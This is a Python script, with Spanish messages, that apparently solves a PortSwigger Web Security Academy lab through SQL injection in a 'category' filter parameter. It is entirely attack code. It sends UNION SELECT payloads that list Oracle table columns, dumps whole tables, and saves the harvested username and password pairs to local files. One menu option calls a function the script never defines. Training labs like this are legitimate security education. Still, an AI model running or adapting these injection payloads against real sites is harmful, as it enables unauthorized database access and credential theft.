#!/usr/bin/env python3

import sys
import re
import requests 
import signal

# Global vars 
host= 'ac681f4e1e5696a6807401b1006f0017.web-security-academy.net' 
url = 'https://{0}/filter'.format(host)


# Function Ctrl+C
def signal_handler(sig, frame):
    print('\n[!] Saliendo ... ')
    sys.exit(1)
signal.signal(signal.SIGINT, signal_handler)

def sqli_requests(sqli):
    try: 

        header = {
                    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0',
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'
                }
        
        payload = {'category': sqli}
        
        r = requests.get(url, params=payload, headers=header)
        
        data_filter = re.findall(r'(?:<tbody>)([\s\S]*)(?:<\/tbody>)', r.text)
        data_filter = re.findall(r'(?<=>)(.*?)(?=<\/)', data_filter[0])
        
        if re.search(r'<p>Solved</p>', r.text):
            print ('Congratulations, you solved the lab!')
        
        print(r.url)
            
        return data_filter
    
    except: 
        print(r.url)
        print("Unexpected error:", sys.exc_info()[0])
        print ("Web content: ")
        return r.text


def enum_tables(db_name):
    name = '../info/tables/ORACLE_db_tables_{0}.txt'.format(db_name)

    tables = open(name,'w')
    #ORACLE 
    info_table = sqli_requests('\'UNION SELECT column_name,NULL FROM ALL_TAB_COLUMNS where table_name=\'{0}\'-- -'.format(db_name))
    #Postgres
#    info_table = sqli_requests('\'UNION SELECT column_name,NULL FROM information_schema.columns where table_name=\'{0}\'-- -'.format(db_name))
    
    extract_info = sqli_requests('\'UNION SELECT * from {0}-- -'.format(db_name)) 
    if extract_info != 'Internal Server Error':
        for i in range(0,len(extract_info),2):
            user = extract_info[i]
            passwd = extract_info[i+1]
            tables.write("{0} : {1}\n".format(user,passwd))
    tables.close()
    return info_table


def main():

    while True:
        option = input('[ manual (default) | enum (emumeration databases) ] Option: ')
        if option != 'exit': 
            sqli=input("SQLI: ")
            data = sqli_requests(sqli)
            if option == 'enum':
                f=open('../info/databases/ORACLE_db_names.txt','w')
                for name in data:
                    if 'USER' in name:
                        f.write(name)
                        enum_tables(name)
                f.close()
            elif option == 'blind':
                data = blind_sqli(sqli)
                print(data)
            else:
                print(data)
        else:
            sys.exit(0)

if __name__ == "__main__":
    main()
